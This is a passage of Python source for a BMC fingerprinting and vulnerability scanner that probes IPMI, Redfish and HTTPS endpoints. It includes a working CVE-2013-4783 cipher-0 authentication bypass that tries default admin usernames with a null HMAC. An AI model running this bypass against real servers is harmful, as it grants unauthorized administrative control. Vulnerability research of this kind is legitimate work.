#!/usr/bin/env python3
"""
bmc-id — comprehensive unauthenticated BMC identification + vulnerability probe.

INVOKE: bmc-id <ip> [-t SEC] [-v] [-q] [--no-https] [--tuple-map PATH]

WHAT     Chains six unauthenticated probes against a single BMC and emits a
         consolidated identification + vulnerability report:

           1. Get Channel Auth Capabilities (NetFn 0x06 / Cmd 0x38)
              → IPMI tuple, security posture (cipher 0 likelihood, null
                user, MD5 vs MD2 vs StraightPwd auth)
              → fleet-vendor lookup via tuple_map.json (76-cluster table)
           2. Get Device ID (NetFn 0x06 / Cmd 0x01)
              → REAL manufacturer IANA PEN, product_id, firmware revision
              → BMC generation guess via consts.BMC_GENERATION (Dell map
                + heuristic for other vendors)
           3. Get System GUID (NetFn 0x06 / Cmd 0x37)
              → 16-byte UUID; reflector-detection signal (when many IPs
                in a /24 share the same GUID = single canned middlebox);
              → embedded MAC OUI extraction (some BMCs use MAC-derived
                node field per RFC 4122 v1)
           4. Get Channel Cipher Suites (NetFn 0x06 / Cmd 0x54)
              → enumerated cipher list; flag cipher 0 (CVE-2013-4783)
                if advertised
           5. HTTPS grab on TCP/443 (best-effort, cert + Server header)
              → cert CN / issuer / SAN, Server header, page title;
                resolves Supermicro vs ASRockRack vs generic-AMI
                ambiguity that pure IPMI tuples cannot

WHY      Get-Chan-Auth-Caps alone classifies ~95% of the public BMC
         fleet at the firmware-family level (see findings.md "What is
         an IPMI tuple?"), but the OEM IANA in that response is often
         a firmware-stuffed marker (e.g. 0x005345 = ASCII "ES" used by
         all AMI MegaRAC) — not the real silicon vendor. Get-Device-ID
         returns the registered IANA PEN, product_id, and firmware
         version. HTTPS grab disambiguates rebadged AMI variants
         (Supermicro / ASRockRack / ASUS / generic-Quanta). Combining
         all three usually pushes confidence from 86% to ~99%.

         All probes are sessionless and unauthenticated. Total cost is
         four UDP packets + one TCP/443 handshake — safe to fan out at
         scan-velocity.

SUCCESS  Against Dell iDRAC6 (192.168.0.23):
            $ python examples/bmc-id 192.168.0.23
            target: 192.168.0.23
            ──── Get Channel Auth Caps ────
            tuple        = ch1_a86_s14_e03_o000000
            ...
            ──── Get Device ID ────
            manufacturer = 674 (Dell)
            product_id   = 0x0100 → iDRAC6 (Monolithic)
            fw_revision  = 2.92
            ...
            ──── Get System GUID ────
            guid         = a8b0c0d0-e0f0-1020-3040-506070809000
            ...
            ──── Get Channel Cipher Suites ────
            cipher_list  = [0,1,2,3,6,7,8,11,12,17]   ⚠ CIPHER 0 ENABLED
            ──── HTTPS :443 ────
            server       = Mbedthis-Appweb/2.4.2
            cert_cn      = idrac-S1NCD8X
            page_title   = iDRAC6 Login

            ─────────── verdict ───────────
            family       = Dell iDRAC6 (real vendor 674; matches tuple cluster)
            confidence   = high (3 independent signals agree)

TARGET   Any IPMI 1.5/2.0 BMC reachable on UDP/623; HTTPS optional.
         Verified on Dell PowerEdge T710 / iDRAC6.

BUILD    pip install -e .
RUN      python examples/bmc-id <bmc-ip> [timeout-seconds]
            [--no-https] [--tuple-map /path/to/tuple_map.json]
EXIT     0 on at least one decoded probe; 1 on all probes failing.

RELATED  examples/01_get_chan_auth_caps.py (single-probe baseline)
         zipmi/scapy_ipmi/commands.py
         zipmi/consts.py (IANA, BMC_GENERATION, guess_bmc_generation)
         zipmi/data/zmap-ipmi-decode/ (bundled fingerprint KB: tuple_map.json + kb/)
"""

from __future__ import annotations

import ipaddress
import json
import socket
import ssl
import sys
from pathlib import Path

import os
import re
import struct

from zipmi.consts import BMC_GENERATION, COMP_CODE, IANA, guess_bmc_generation
from zipmi.core import Transport
from zipmi import _msg
from zipmi.scapy_ipmi.commands import (
    GetChanAuthCapsReq,
    GetChannelCipherSuitesReq,
    GetSessionChallengeReq,
)

# Bundled fingerprint KB (internet-wide IPMI scan analysis), shipped in the
# package so `bmc-id` is self-contained. Override with --tuple-map / --kb-dir.
_DATA_DIR         = Path(__file__).resolve().parent.parent / "data" / "zmap-ipmi-decode"
DEFAULT_TUPLE_MAP = _DATA_DIR / "tuple_map.json"
DEFAULT_KB_DIR    = _DATA_DIR / "kb"
DEFAULT_TIMEOUT   = 3.0  # seconds per probe; iDRAC6 needs ~5


def load_kb(kb_dir: Path) -> dict:
    """Load distilled knowledge from 26,788-host corpus analyzer runs.
    Files: cookies.json, form_fields.json, server_headers.json,
    lib_cves.json, asset_shas.json. Each maps {key: {vendor, count, purity}}."""
    kb = {"cookies": {}, "form_fields": {}, "server_headers": {},
          "lib_cves": {}, "asset_shas": {}}
    if not kb_dir.exists(): return kb
    for name in kb:
        p = kb_dir / f"{name}.json"
        if p.exists():
            try: kb[name] = json.loads(p.read_text())
            except Exception: pass
    return kb


def probe_redfish(host: str, timeout: float) -> dict:
    """Unauth GET /redfish/v1/ ServiceRoot. Per Redfish spec, must be
    anon-readable; 48% of public BMCs leak Vendor/Manufacturer here."""
    vlog("→ Redfish ServiceRoot /redfish/v1/")
    import socket as _s
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try: ctx.minimum_version = ssl.TLSVersion.SSLv3
    except (AttributeError, ValueError): pass
    try: ctx.set_ciphers("ALL:@SECLEVEL=0")
    except ssl.SSLError: pass
    try:
        with _s.create_connection((host, 443), timeout=timeout) as raw:
            with ctx.wrap_socket(raw, server_hostname=host) as s:
                s.sendall((f"GET /redfish/v1/ HTTP/1.0\r\nHost: {host}\r\n"
                           f"Accept: application/json\r\nUser-Agent: bmc-id/1.0\r\n\r\n").encode())
                buf = b""
                while len(buf) < 65536:
                    ch = s.recv(4096)
                    if not ch: break
                    buf += ch
    except (OSError, ssl.SSLError) as e:
        return {"error": f"{type(e).__name__}"}
    if b"\r\n\r\n" not in buf: return {"error": "no body"}
    head, _, body = buf.partition(b"\r\n\r\n")
    m = re.match(rb"HTTP/[\d.]+\s+(\d+)", head.split(b"\r\n", 1)[0])
    status = int(m.group(1)) if m else 0
    if status >= 400: return {"status": status, "error": f"http {status}"}
    try: d = json.loads(body)
    except Exception: return {"status": status, "error": "non-json"}
    out = {"status": status}
    for k in ("Vendor", "Manufacturer", "Product", "RedfishVersion", "Name"):
        if k in d: out[k] = str(d[k])[:200]
    if isinstance(d.get("Oem"), dict):
        out["Oem_keys"] = list(d["Oem"].keys())[:5]
    return out

# Verbosity flags (set in main()). Module-globals so probe runners can chirp.
VERBOSE = False
QUIET   = False


import threading
_TARGET_TLS = threading.local()

def vlog(msg: str) -> None:
    """Verbose trace — always to stderr (so JSON stdout stays clean).
    When parallel, prepends [verbose target=IP] for demuxing."""
    if VERBOSE and not QUIET:
        tgt = getattr(_TARGET_TLS, "target", None)
        prefix = f"[verbose target={tgt}] " if tgt else "[verbose] "
        print(f"  {prefix}{msg}", file=sys.stderr, flush=True)


# ──────────────────────── helpers ────────────────────────

def decode_auth_bits(b: int) -> list[str]:
    out = []
    if b & 0x01: out.append("none")
    if b & 0x02: out.append("MD2")
    if b & 0x04: out.append("MD5")
    if b & 0x10: out.append("StraightPwd")
    if b & 0x20: out.append("OEM")
    if b & 0x80: out.append("IPMI2.0_ext")
    return out


def decode_status_bits(b: int) -> list[str]:
    out = []
    if b & 0x01: out.append("anon_login_non_null")
    if b & 0x02: out.append("null_user")
    if b & 0x04: out.append("non_null_user")
    if b & 0x08: out.append("user_level_auth_disabled")
    if b & 0x10: out.append("per_msg_auth_disabled")
    if b & 0x20: out.append("KG_set")
    return out


def decode_ext_bits(b: int) -> list[str]:
    out = []
    if b & 0x01: out.append("IPMI1.5")
    if b & 0x02: out.append("IPMI2.0")
    return out


def tuple_key(channel: int, auth: int, status: int, ext: int, oem: int) -> str:
    return f"ch{channel}_a{auth:02x}_s{status:02x}_e{ext:02x}_o{oem:06x}"


def lookup_vendor(key: str, map_path: Path) -> dict | None:
    if not map_path.exists():
        return None
    try:
        return json.loads(map_path.read_text()).get(key)
    except (OSError, json.JSONDecodeError):
        return None


def parse_guid_v1_mac(guid: bytes) -> str | None:
    """RFC 4122 v1 UUID encodes the MAC in the last 6 bytes (node field).
    Return MAC string only if version=1 AND variant=10b (RFC 4122) AND node
    bytes look plausible. Without the variant check, vendor-encoded GUIDs
    that happen to have byte-7-high-nibble=1 (e.g. Supermicro 'ascii_prefix
    _zero_pad' often does) get mistakenly tagged as v1 UUIDs."""
    if len(guid) != 16:
        return None
    version = (guid[7] >> 4) & 0xF
    variant = (guid[8] >> 6) & 0x3
    if version != 1 or variant != 0b10:
        return None
    mac = guid[10:16]
    if mac == b"\x00" * 6 or mac == b"\xff" * 6:
        return None
    return ":".join(f"{b:02x}" for b in mac)


def fingerprint_guid(guid: bytes) -> dict:
    """Recognize vendor patterns in the raw 16-byte GUID.

    Many BMCs violate the IPMI spec (which mandates a true 16-byte UUID
    chosen by the BMC) and instead return:
       - host SMBIOS UUID (Dell)              → first 4 bytes ASCII "DELL"
                                                  (LE 0x4c4c4544)
       - ASCII model marker + zeros (Supermicro) → first 6-8 bytes printable
                                                     ASCII, trailing zeros
       - all-zeros or all-FFs (Fujitsu, broken fw) → degenerate
       - proper RFC 4122 v1 with vendor OUI   → genuine BMC ident
       - identical GUID across a /24          → reflector middlebox (caller
                                                   detects via cross-host
                                                   comparison, not here)

    Returns dict { 'pattern': str, 'note': str } describing the signature.
    """
    if len(guid) != 16:
        return {"pattern": "malformed", "note": f"len={len(guid)}"}
    if guid == b"\x00" * 16:
        return {"pattern": "all_zero", "note": "BMC returned zero GUID — broken or stripped"}
    if guid == b"\xff" * 16:
        return {"pattern": "all_ff", "note": "BMC returned all-FFs — broken or placeholder"}

    # Dell SMBIOS-violation GUID: starts with LE bytes for "DELL" (0x44 0x45 0x4c 0x4c)
    if guid[:4] == b"DELL" or guid[:4] == b"LLED":
        return {
            "pattern": "dell_smbios",
            "note": "Dell SMBIOS UUID (ipmitool flags as spec violation); "
                    "derived from host Service Tag via SHA-1 v5",
        }

    # Supermicro: first 6-8 bytes printable ASCII + trailing zero block
    ascii_prefix_len = 0
    for b in guid[:12]:
        if 0x20 <= b < 0x7F:
            ascii_prefix_len += 1
        else:
            break
    trailing_zeros = 0
    for b in reversed(guid):
        if b == 0:
            trailing_zeros += 1
        else:
            break
    if ascii_prefix_len >= 4 and trailing_zeros >= 4:
        prefix = guid[:ascii_prefix_len].decode("ascii", "replace")
        return {
            "pattern": "ascii_prefix_zero_pad",
            "note": f"ASCII prefix '{prefix}' + trailing zeros — Supermicro-style "
                    f"firmware-encoded ID, not a real UUID",
        }

    # RFC 4122 version nibble: byte 7 high nibble
    version = (guid[7] >> 4) & 0xF
    variant = (guid[8] >> 6) & 0x3
    if version == 1 and variant == 0b10:
        mac = guid[10:16]
        if mac != b"\x00" * 6 and mac != b"\xff" * 6:
            oui = ":".join(f"{b:02x}" for b in mac[:3])
            return {
                "pattern": "rfc4122_v1",
                "note": f"genuine RFC 4122 v1 UUID with MAC {':'.join(f'{b:02x}' for b in mac)} "
                        f"(OUI {oui}) — proper BMC identity",
            }
    if version == 4 and variant == 0b10:
        return {"pattern": "rfc4122_v4", "note": "RFC 4122 v4 random UUID"}
    if version == 5 and variant == 0b10:
        return {"pattern": "rfc4122_v5", "note": "RFC 4122 v5 name-based (SHA-1) UUID"}

    # Catch-all
    return {"pattern": "unrecognized", "note": "no known vendor signature"}


# Algorithm-number → name (IPMI 2.0 §13.28, tables 13-17/18/19).
_AUTH_ALG = {0: "none", 1: "sha1", 2: "md5", 3: "sha256"}
_INTEG_ALG = {0: "none", 1: "sha1-96", 2: "md5-128", 3: "md5", 4: "sha256-128"}
_CONF_ALG = {0: "none", 1: "aes-cbc-128", 2: "xrc4-128", 3: "xrc4-40"}


def parse_cipher_suite_records(data: bytes) -> list[dict]:
    """Decode the 'List Algorithms by Cipher Suite' payload (IPMI 2.0 §22.15.1).

    A sequence of records, each: a Start-Of-Record byte (0xC0 = standard, next
    byte is the suite ID; 0xC1 = OEM, next 3 bytes are the OEM IANA LS-first,
    then the suite ID), followed by algorithm bytes whose top two bits give the
    type — 00b auth, 01b integrity, 10b confidentiality — and low 6 bits the
    algorithm number. Records may span 16-byte fetch chunks, so this parses the
    *accumulated* payload (channel byte already stripped)."""
    out: list[dict] = []
    cur: dict | None = None
    i, n = 0, len(data)
    while i < n:
        b = data[i]
        if b & 0xC0 == 0xC0:                     # start of record
            if b == 0xC1:                        # OEM: 3-byte IANA + id
                if i + 4 >= n:
                    break
                iana = data[i + 1] | (data[i + 2] << 8) | (data[i + 3] << 16)
                cur = {"id": data[i + 4], "auth": None, "integ": None,
                       "conf": None, "oem_iana": iana}
                i += 5
            else:                                # standard (0xC0): 1-byte id
                if i + 1 >= n:
                    break
                cur = {"id": data[i + 1], "auth": None, "integ": None,
                       "conf": None, "oem_iana": None}
                i += 2
            out.append(cur)
            continue
        if cur is not None:                      # algorithm byte
            tag, val = b & 0xC0, b & 0x3F
            if tag == 0x00:
                cur["auth"] = val
            elif tag == 0x40:
                cur["integ"] = val
            elif tag == 0x80:
                cur["conf"] = val
        i += 1
    return out


def cipher_suite_algs(rec: dict) -> str:
    """'sha1/sha1-96/aes-cbc-128' for one decoded record."""
    def name(m, v):
        return "?" if v is None else m.get(v, f"{v}")
    return "/".join((name(_AUTH_ALG, rec["auth"]),
                     name(_INTEG_ALG, rec["integ"]),
                     name(_CONF_ALG, rec["conf"])))


def parse_cipher_list(payload: bytes) -> list[int]:
    """Suite IDs from a single Get-Channel-Cipher-Suites payload (leading
    channel byte stripped). Correctly decodes the by-cipher-suite records."""
    if not payload:
        return []
    return [r["id"] for r in parse_cipher_suite_records(bytes(payload[1:]))]


# ──────────────────────── probe runners ────────────────────────

def probe_auth_caps(t: Transport) -> dict | None:
    vlog("→ Get Channel Auth Caps (NetFn 0x06 / Cmd 0x38)")
    req = GetChanAuthCapsReq(v20_ext=1, channel=0xE, max_priv=0x4)
    try:
        msg, resp = t.sessionless_request(0x06, 0x38, req, rq_seq=1)
    except OSError as e:
        return {"error": f"transport: {e}"}
    if resp is None or resp.comp_code != 0x00:
        cc = resp.comp_code if resp is not None else None
        return {"error": f"comp_code={cc}"}
    iana = resp.oem_iana_int()
    return {
        "channel":    resp.channel,
        "auth":       resp.auth_type_support,
        "status":     resp.status,
        "ext":        resp.ext_caps,
        "oem_iana":   iana,
        "tuple":      tuple_key(resp.channel, resp.auth_type_support,
                                resp.status, resp.ext_caps, iana),
    }


def probe_device_id(t: Transport) -> dict | None:
    vlog("→ Get Device ID (NetFn 0x06 / Cmd 0x01)")
    try:
        msg, resp = t.sessionless_request(0x06, 0x01, None, rq_seq=2)
    except OSError as e:
        return {"error": f"transport: {e}"}
    if resp is None or resp.comp_code != 0x00:
        cc = resp.comp_code if resp is not None else None
        return {"error": f"comp_code={cc}"}
    return {
        "device_id":     resp.device_id,
        "device_rev":    resp.device_revision,
        "fw_rev":        resp.fw_revision(),
        "ipmi_version":  resp.ipmi_version,
        "manufacturer":  resp.manufacturer_id_int(),
        "product_id":    resp.product_id,
        "aux_fw_rev":    resp.aux_fw_rev.hex() if resp.aux_fw_rev else "",
    }


def probe_system_guid(t: Transport) -> dict | None:
    vlog("→ Get System GUID (NetFn 0x06 / Cmd 0x37)")
    try:
        msg, resp = t.sessionless_request(0x06, 0x37, None, rq_seq=3)
    except OSError as e:
        return {"error": f"transport: {e}"}
    if resp is None or resp.comp_code != 0x00:
        cc = resp.comp_code if resp is not None else None
        return {"error": f"comp_code={cc}"}
    g = resp.guid
    hexstr = g.hex()
    rfc4122 = f"{hexstr[:8]}-{hexstr[8:12]}-{hexstr[12:16]}-{hexstr[16:20]}-{hexstr[20:]}"
    fp = fingerprint_guid(g)
    return {
        "guid_raw":  hexstr,
        "guid_rfc":  rfc4122,
        "mac_v1":    parse_guid_v1_mac(g),
        "pattern":   fp["pattern"],
        "pattern_note": fp["note"],
    }


def probe_cipher_suites(t: Transport) -> dict | None:
    """Enumerate advertised cipher suites via Get Channel Cipher Suites (0x54),
    'list algorithms by cipher suite'. Fetches 16 bytes per list index and
    keeps going until a short chunk (<16 data bytes) signals the end; records
    can span chunk boundaries so we accumulate then decode."""
    vlog("→ Get Channel Cipher Suites (NetFn 0x06 / Cmd 0x54)")
    acc = b""
    for idx in range(0x40):                        # list index 0..63 (safety cap)
        req = GetChannelCipherSuitesReq(channel=0xE, payload_type=0,
                                        list_index=0x80 | idx)
        try:
            msg, resp = t.sessionless_request(0x06, 0x54, req, rq_seq=4,
                                              rmcp_plus=True)
        except OSError as e:
            return {"error": f"transport: {e}"}
        if resp is None or resp.comp_code != 0x00:
            if idx == 0:                           # first fetch failed → real error
                cc = resp.comp_code if resp is not None else None
                return {"error": f"comp_code={cc}"}
            break                                  # later index rejected → done
        raw = bytes(msg.data) if msg is not None else b""
        # raw layout: [comp_code][channel][up to 16 data bytes]
        chunk = raw[2:] if len(raw) >= 2 else b""
        acc += chunk
        if len(chunk) < 16:                        # last chunk
            break
    records = parse_cipher_suite_records(acc)
    suites = [r["id"] for r in records]
    return {
        "cipher_list":    suites,
        "cipher0":        0 in suites,
        "cipher_details": records,
    }


def probe_active_v15(t: Transport) -> dict:
    """Active IPMI 1.5 reachability check via Get-Session-Challenge.

    Sessionless probe that initiates a 1.5 LAN session. We send with auth_type
    = MD5 and a zero username. The BMC's reply (comp_code == 0) confirms 1.5
    LAN is alive. Common non-zero codes:
        0x81 = invalid user name (still proves 1.5 stack works)
        0x82 = null username disabled
        0xc1 = command not supported
    Anything that decodes proves 1.5 is up; only timeout = 1.5 not active.
    """
    vlog("→ Get Session Challenge (NetFn 0x06 / Cmd 0x39) — IPMI 1.5 active probe")
    req = GetSessionChallengeReq(auth_type=0x02, user_name=b"\x00" * 16)
    try:
        msg, resp = t.sessionless_request(0x06, 0x39, req, rq_seq=5)
    except OSError as e:
        return {"active": False, "error": f"transport: {e}"}
    if resp is None:
        return {"active": False, "error": "no decoded reply"}
    cc = resp.comp_code
    # Spec §22.16: cmd-specific codes for Get-Session-Challenge.
    sc_codes = {
        0x00: "OK (challenge issued)",
        0x81: "invalid user name",
        0x82: "null user disabled",
        0xc1: "command not supported",
    }
    cc_name = sc_codes.get(cc) or COMP_CODE.get(cc) or f"0x{cc:02x}"
    # ANY response (even error) proves the 1.5 stack handled the cmd.
    return {"active": True, "comp_code": cc, "comp_name": cc_name}


RMCP_PLUS_STATUS = {
    0x00: "OK", 0x01: "insufficient resources", 0x02: "invalid session id",
    0x03: "invalid payload type", 0x04: "invalid auth algorithm",
    0x05: "invalid integrity algorithm", 0x06: "no matching auth payload",
    0x07: "no matching integrity payload", 0x08: "inactive session id",
    0x09: "invalid role", 0x0A: "unauthorized role/priv requested",
    0x0D: "unauthorized name", 0x0E: "unauthorized GUID",
    0x10: "invalid confidentiality algorithm",
    0x11: "no cipher suite match (cipher 0 advertised but not accepted)",
    0x12: "illegal/unrecognized parameter",
}

DEFAULT_CIPHER0_USERS = ("admin", "ADMIN", "root", "USERID", "Administrator")


def _build_open_session_pkt(rcs_sid: int) -> bytes:
    """RMCP+ Open Session Request offering cipher suite 0 = (0,0,0).
    max_priv=0x04 (Administrator) — explicit value works on all vendors;
    max_priv=0 is rejected by some AMI firmware with 0x12 illegal-param."""
    payload = (bytes([0x00, 0x04, 0x00, 0x00])
               + struct.pack("<I", rcs_sid)
               + bytes([0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00])  # auth=0
               + bytes([0x01, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00])  # integ=0
               + bytes([0x02, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00])) # conf=0
    rmcp = bytes([0x06, 0x00, 0xff, 0x07])
    sess = bytes([0x06, 0x10]) + b"\x00" * 4 + b"\x00" * 4 + struct.pack("<H", len(payload))
    return rmcp + sess + payload


def _build_rakp1_pkt(bmc_sid: int, console_rand: bytes, user: str) -> bytes:
    """RAKP Message 1 — request RAKP-2 from BMC for given username.
    Priv 0x14 = name-only-lookup + admin role."""
    user_b = user.encode("ascii", "replace")[:16]
    payload = (bytes([0x00, 0x00, 0x00, 0x00])
               + struct.pack("<I", bmc_sid)
               + console_rand
               + bytes([0x14, 0x00, 0x00, len(user_b)])
               + user_b)
    rmcp = bytes([0x06, 0x00, 0xff, 0x07])
    sess = bytes([0x06, 0x12]) + b"\x00" * 4 + b"\x00" * 4 + struct.pack("<H", len(payload))
    return rmcp + sess + payload


def _build_rakp3_pkt(bmc_sid: int) -> bytes:
    """RAKP Message 3 w/ NULL HMAC (cipher-0 bypass)."""
    payload = bytes([0x00, 0x00, 0x00, 0x00]) + struct.pack("<I", bmc_sid)
    rmcp = bytes([0x06, 0x00, 0xff, 0x07])
    sess = bytes([0x06, 0x14]) + b"\x00" * 4 + b"\x00" * 4 + struct.pack("<H", len(payload))
    return rmcp + sess + payload


def _udp_xchg(sock, pkt: bytes, timeout: float) -> bytes | None:
    sock.settimeout(timeout)
    try:
        sock.send(pkt)
        return sock.recv(4096)
    except (TimeoutError, OSError):
        return None


def probe_cipher0_active(host: str, port: int, timeout: float,
                         users: tuple[str, ...] = DEFAULT_CIPHER0_USERS) -> dict:
    """Full CVE-2013-4783 PoC: Open Session w/ cipher 0 → RAKP-1 (each user)
    → RAKP-3 NULL HMAC → check RAKP-4 status. Returns:
       cipher0_exploitable=True   — full session opened with WRONG password
       cipher0_accepted=True      — passed Open Session, RAKP failed
       cipher0_accepted=False     — refused at Open Session

    Per-user retry creates FRESH Open Session each attempt — BMCs invalidate
    SID after a failed RAKP-1 (status 0x08) so reusing it for next user
    always fails."""
    import socket as _s
    vlog(f"→ Cipher 0 PoC: Open Session + RAKP-1/3 NULL-HMAC ({len(users)} usernames)")

    def open_session(sock):
        rcs_sid = struct.unpack("<I", os.urandom(4))[0] | 0x01000000
        data = _udp_xchg(sock, _build_open_session_pkt(rcs_sid), timeout)
        if not data or len(data) < 18 or data[:4] != b"\x06\x00\xff\x07" or data[4] != 0x06:
            return None
        osr = data[16:]
        if len(osr) < 4: return None
        status = osr[1]
        if status != 0x00 or len(osr) < 36:
            return {"status": status}
        return {
            "status": 0,
            "bmc_sid": struct.unpack("<I", osr[8:12])[0],
            "auth_algo": osr[16], "integ_algo": osr[24], "conf_algo": osr[32],
        }

    try:
        sock = _s.socket(_s.AF_INET, _s.SOCK_DGRAM)
        sock.connect((host, port))
    except OSError as e:
        return {"error": f"{type(e).__name__}: {e}"}
    try:
        os_r = open_session(sock)
        if os_r is None:
            return {"error": "no Open-Session reply"}
        if os_r["status"] != 0x00:
            return {"cipher0_accepted": False, "open_status": os_r["status"],
                    "note": RMCP_PLUS_STATUS.get(os_r["status"], f"status 0x{os_r['status']:02x}")}
        if (os_r.get("auth_algo"), os_r.get("integ_algo"), os_r.get("conf_algo")) != (0,0,0):
            return {"cipher0_accepted": False,
                    "note": f"BMC selected non-zero algos {(os_r.get('auth_algo'), os_r.get('integ_algo'), os_r.get('conf_algo'))} — NOT cipher 0"}

        bmc_sid = os_r["bmc_sid"]
        last_rakp2 = None
        for user in users:
            data = _udp_xchg(sock, _build_rakp1_pkt(bmc_sid, os.urandom(16), user), timeout)
            if data and len(data) >= 18 and data[5] == 0x13 and len(data[16:]) >= 2:
                last_rakp2 = data[17]
                if last_rakp2 == 0x00:
                    data4 = _udp_xchg(sock, _build_rakp3_pkt(bmc_sid), timeout)
                    if data4 and len(data4) >= 18 and data4[5] == 0x15 and len(data4[16:]) >= 2:
                        r4 = data4[17]
                        if r4 == 0x00:
                            return {"cipher0_accepted": True, "cipher0_exploitable": True,
                                    "open_status": 0, "rakp2_status": 0, "rakp4_status": 0,
                                    "user": user, "bmc_sid": f"0x{bmc_sid:08x}",
                                    "note": f"⚠ EXPLOITABLE — session ACTIVE for user '{user}' with WRONG password (CVE-2013-4783)"}
                        return {"cipher0_accepted": True, "cipher0_exploitable": False,
                                "open_status": 0, "rakp2_status": 0, "rakp4_status": r4,
                                "user": user,
                                "note": f"BMC refused at RAKP-4 (status 0x{r4:02x}) — null-HMAC blocked downstream"}
            # Failed → fresh Open Session for next user
            os_r = open_session(sock)
            if os_r is None or os_r.get("status") != 0x00:
                break
            if (os_r.get("auth_algo"), os_r.get("integ_algo"), os_r.get("conf_algo")) != (0,0,0):
                break
            bmc_sid = os_r["bmc_sid"]
        return {"cipher0_accepted": True, "cipher0_exploitable": False,
                "open_status": 0, "rakp2_status": last_rakp2,
                "note": (f"all {len(users)} usernames refused at RAKP-2 "
                         f"(last status {('0x%02x' % last_rakp2) if last_rakp2 is not None else 'no-reply'}). "
                         f"Try with username from prior RAKP capture for this host.")}
    finally:
        sock.close()


def probe_active_v20(host: str, port: int, timeout: float) -> dict:
    """Active IPMI 2.0 reachability check via RMCP+ Open Session Request.

    Spec: IPMI 2.0 §13.17. Sessionless. We offer all standard algorithms
    (auth=HMAC-SHA1, integrity=HMAC-SHA1-96, conf=AES-CBC-128 — cipher
    suite 3) and request highest privilege. BMC responds with Open Session
    Response containing the BMC-assigned session ID and selected algorithms,
    or refuses with an error byte. Either way, getting any RMCP+ format
    response proves IPMI 2.0 is active.
    """
    import socket as _s
    vlog(f"→ RMCP+ Open Session Request (payload type 0x10) — IPMI 2.0 active probe")

    # Build Open Session Request payload (32 bytes per spec).
    rcs_sid = struct.unpack("<I", os.urandom(4))[0] | 0x01000000  # ensure non-zero
    payload = b"".join([
        bytes([0x00, 0x00, 0x00, 0x00]),                  # tag, max_priv=0, rsvd, rsvd
        struct.pack("<I", rcs_sid),                       # remote console SID
        bytes([0x00, 0x00, 0x00, 0x08, 0x01]) + b"\x00\x00\x00",  # auth: HMAC-SHA1
        bytes([0x01, 0x00, 0x00, 0x08, 0x01]) + b"\x00\x00\x00",  # integ: HMAC-SHA1-96
        bytes([0x02, 0x00, 0x00, 0x08, 0x01]) + b"\x00\x00\x00",  # conf: AES-CBC-128
    ])
    # RMCP+ session wrapper.
    rmcp = bytes([0x06, 0x00, 0xff, 0x07])
    sess_hdr = bytes([
        0x06,         # auth_type = RMCP+
        0x10,         # payload type = Open Session Request
    ]) + b"\x00" * 4 + b"\x00" * 4 + struct.pack("<H", len(payload))
    pkt = rmcp + sess_hdr + payload

    try:
        with _s.socket(_s.AF_INET, _s.SOCK_DGRAM) as s:
            s.settimeout(timeout)
            s.connect((host, port))
            s.send(pkt)
            data = s.recv(4096)
    except OSError as e:
        return {"active": False, "error": f"{type(e).__name__}: {e}"}

    if len(data) < 8 or data[:4] != b"\x06\x00\xff\x07":
        return {"active": False, "error": "non-RMCP reply"}
    if data[4] != 0x06:
        return {"active": False, "error": f"reply auth_type=0x{data[4]:02x} (not RMCP+)"}
    # data[5] should be 0x11 (Open Session RESPONSE) per spec.
    if data[5] != 0x11:
        return {"active": True, "note": f"RMCP+ replied with payload type 0x{data[5]:02x} "
                                         f"(not 0x11 Open-Session-Resp; still proves 2.0 active)"}
    # Parse Open Session Response: tag, status, max_priv, rsvd, rcs_sid, mc_sid, algos
    osr = data[16:]   # skip RMCP(4) + sess_hdr(12)
    if len(osr) < 36:
        return {"active": True, "note": "Open-Session-Resp truncated; 2.0 active"}
    status = osr[1]
    mc_sid = struct.unpack("<I", osr[8:12])[0]
    return {
        "active": True,
        "open_status": status,
        "open_status_name": (
            "OK" if status == 0 else
            f"refused (0x{status:02x} — BMC may require non-default cipher)"
        ),
        "bmc_sid": f"0x{mc_sid:08x}",
    }


def probe_https(host: str, timeout: float) -> dict | None:
    """Best-effort HTTPS grab: TCP connect, TLS handshake, fetch /,
    parse Server header, page title, cert CN/issuer/SAN."""
    vlog(f"→ HTTPS GET https://{host}/  (timeout {timeout}s)")
    out = {}
    # iDRAC6 / IMM2 ship ancient TLS — permissive context, all protocols.
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        ctx.minimum_version = ssl.TLSVersion.SSLv3
    except (AttributeError, ValueError):
        pass
    try:
        ctx.set_ciphers("ALL:@SECLEVEL=0")
    except ssl.SSLError:
        pass
    try:
        with socket.create_connection((host, 443), timeout=timeout) as raw:
            with ctx.wrap_socket(raw, server_hostname=host) as s:
                cert = s.getpeercert(binary_form=False)  # may be None when CERT_NONE
                cert_bin = s.getpeercert(binary_form=True)
                out["cert_present"] = cert_bin is not None
                if cert_bin:
                    # Save full PEM for downstream tools (openssl x509, etc).
                    import base64 as _b64
                    b64 = _b64.b64encode(cert_bin).decode("ascii")
                    pem_lines = [b64[i:i+64] for i in range(0, len(b64), 64)]
                    out["cert_pem"] = (
                        "-----BEGIN CERTIFICATE-----\n"
                        + "\n".join(pem_lines)
                        + "\n-----END CERTIFICATE-----\n"
                    )
                    import hashlib as _h
                    out["cert_sha256"] = _h.sha256(cert_bin).hexdigest()
                if cert and cert.get("subject"):
                    out["cert_cn"] = ",".join(
                        v for rdn in cert["subject"] for k, v in rdn if k == "commonName"
                    )
                if cert and cert.get("issuer"):
                    out["cert_issuer"] = ",".join(
                        v for rdn in cert["issuer"] for k, v in rdn if k == "commonName"
                    )
                if cert and cert.get("subjectAltName"):
                    out["cert_san"] = ",".join(v for _, v in cert["subjectAltName"])
                # Cert from binary form when CERT_NONE (default Python returns {}).
                # Also extract validity dates, signature algorithm, key length —
                # all of these signal factory-default certs (e.g. iDRAC6 ships
                # 1024-bit RSA + SHA1 + 2014 expiry as fleet-shared default;
                # see memory reference_idrac6_factory_cert.md).
                if cert_bin:
                    try:
                        from cryptography import x509
                        from cryptography.hazmat.primitives.asymmetric import rsa, ec
                        c = x509.load_der_x509_certificate(cert_bin)
                        if not out.get("cert_cn"):
                            out["cert_cn"] = c.subject.rfc4514_string()
                            out["cert_issuer"] = c.issuer.rfc4514_string()
